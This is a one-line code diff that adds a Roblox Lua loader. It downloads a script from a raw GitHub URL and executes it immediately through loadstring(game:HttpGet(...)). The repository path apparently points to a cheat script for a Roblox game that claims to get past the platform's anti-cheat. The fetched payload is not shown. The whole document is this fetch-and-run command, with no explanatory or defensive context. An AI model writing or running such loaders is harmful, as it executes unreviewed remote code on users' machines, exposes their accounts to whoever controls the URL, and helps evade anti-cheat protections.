@@ -1,0 +1,1 @@
+loadstring(game:HttpGet('https://raw.githubusercontent.com/Yousuck780/adopt/main/byfron%20is%20out'))()
